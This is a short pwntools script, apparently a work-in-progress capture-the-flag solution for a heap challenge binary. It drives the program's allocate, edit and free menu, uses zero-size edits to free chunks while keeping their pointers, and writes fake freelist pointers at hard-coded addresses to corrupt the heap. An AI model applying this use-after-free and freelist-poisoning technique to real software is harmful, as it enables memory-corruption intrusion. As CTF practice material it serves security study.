from pwn import *

e = ELF("./chall")
libc = ELF("./libc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("", )
else:
  p = process(e.path)
  # {"LD_PRELOAD": libc.path})

def alloc(idx, size, data="AAAA", recv=True):
  p.sendline("1")
  p.sendlineafter("index:", str(idx))
  p.sendlineafter("size:", str(size))
  p.sendafter("data:", data)

  if recv:
    p.recvuntil(">")

def edit(idx, size, data="AAAA"):
  p.sendline("2")
  p.sendlineafter("index:", str(idx))
  p.sendlineafter("size:", str(size))
  
  if size != 0:
    p.sendafter("data:", data)

  p.recvuntil(">")

def free(idx):
  p.sendline("3")
  p.sendlineafter("index:", str(idx))

  p.recvuntil(">")

p.recvuntil(">")

alloc(0, 0x30)
edit(0, 0)

edit(0, 0x38, p64(0x602072))
alloc(1, 0x38)
edit(1, 0x48)
free(1)

edit(0, 0x20)
free(0)
#alloc(1, 0x38, "A" * 6 + p64(0x602080) + p64(0x6020b0 - 0xd8), False)

alloc(0, 0x78)
edit(0, 0)

edit(0, 0x78, p64(0x602078))
alloc(1, 0x78)
edit(1, 0x10)
free(1)

debug()

edit(0, 0x78)
free(0)




p.interactive()
